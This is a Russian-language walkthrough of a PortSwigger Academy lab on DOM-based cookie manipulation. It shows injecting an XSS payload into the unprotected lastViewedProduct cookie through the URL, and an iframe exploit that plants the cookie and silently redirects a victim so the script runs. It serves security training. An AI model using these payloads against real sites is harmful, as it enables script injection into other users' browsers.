Откроем уязвимый ресурс

Откроем рандомную карточку товара, и выйдем из нее

Нажмем `ПКМ` -> `Inspect` -> `Application` -> `Storage` -> `Cookies`

и обратим внимание, что существует куки `lastViewedProduct` у которой даже нет галочки на `HttpOnly`

кхе-кхе, она то нам и нужна
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/5.%20DOM-based%20cookie%20manipulation/pics%20for%20walkthrough/1.png)

да и более того, если зайдем в `Proxy` -> `HTTP history `
увидим, что пераметр `lastViewedProduct` фигурирует в каждом запросе
```
lastViewedProduct=https://0a21008703ae286480b5853c00d300ed.web-security-academy.net/product?productId=1
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/5.%20DOM-based%20cookie%20manipulation/pics%20for%20walkthrough/2.png)

Сконфигурируем данный URL
```
https://0a21008703ae286480b5853c00d300ed.web-security-academy.net/product?productId=1&'><script>alert(1)</script>
```

обновим страницу и увидим, что эксплойт отработал


![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/5.%20DOM-based%20cookie%20manipulation/pics%20for%20walkthrough/3.png)

Тем временем вот что происходит внутри кода приложения
```
 <a href='https://0a21008703ae286480b5853c00d300ed.web-security-academy.net/product?productId=1&'><script>alert(1)</script>'>Last viewed product</a>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/5.%20DOM-based%20cookie%20manipulation/pics%20for%20walkthrough/4.png)

Перейдем в `Exploit server`

и введем в поле `Body` следующий iframe 
```
<iframe src="https://0a21008703ae286480b5853c00d300ed.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a21008703ae286480b5853c00d300ed.web-security-academy.net';window.x=1;">
```
Когда iframe загружается в первый раз, браузер временно открывает вредоносный URL-адрес, который затем сохраняется как значение файла cookie lastViewedProduct. Обработчик события onload гарантирует, что жертва будет немедленно перенаправлена на домашнюю страницу, даже не подозревая о том, 
что эта манипуляция когда-либо выполнялась. Хотя в браузере жертвы сохранен зараженный файл cookie, загрузка домашней страницы приведет к выполнению полезной нагрузки.
```
https://www.youtube.com/watch?v=nLZbb8_uxTo
```
вот тут классно объяснен payload
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/5.%20DOM-based%20cookie%20manipulation/pics%20for%20walkthrough/5.png)

Нажмем `Store` -> `Deliver exploit to victim` и получим уведомление об успешно выполненной лабораторной работе
